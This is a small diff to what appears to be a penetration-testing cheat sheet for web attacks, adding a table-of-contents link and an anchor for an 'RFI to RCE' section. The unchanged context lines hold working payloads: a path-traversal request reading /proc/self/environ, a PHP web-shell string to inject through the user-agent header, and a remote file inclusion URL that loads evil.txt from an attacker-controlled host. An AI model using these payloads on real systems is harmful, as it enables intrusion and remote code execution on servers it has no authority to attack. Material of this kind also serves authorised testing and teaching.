@@ -4,6 +4,7 @@
 * [Command Injection](#Cinject)
 * [Directory Path Traversal](#pathtrav)
 * [LFI to RCE](#lfi2rce)
+* [RFI to RCE](#rfi2rce)
 
 
 
@@ -378,7 +379,7 @@ http://secureapplication.example/index.php?view=../../../proc/self/environ
 
 if it works put `GET /<?php system($_GET['cmd']);?>` in the user-agent field then run request 2 like payload
 
-# RFI to RCE
+# **<a name="rfi2rce">RFI to RCE</a>**
 
 `http://<IP>/something.php?name=a&comment=b&LANG=http://<attackIP>/evil.txt`
 
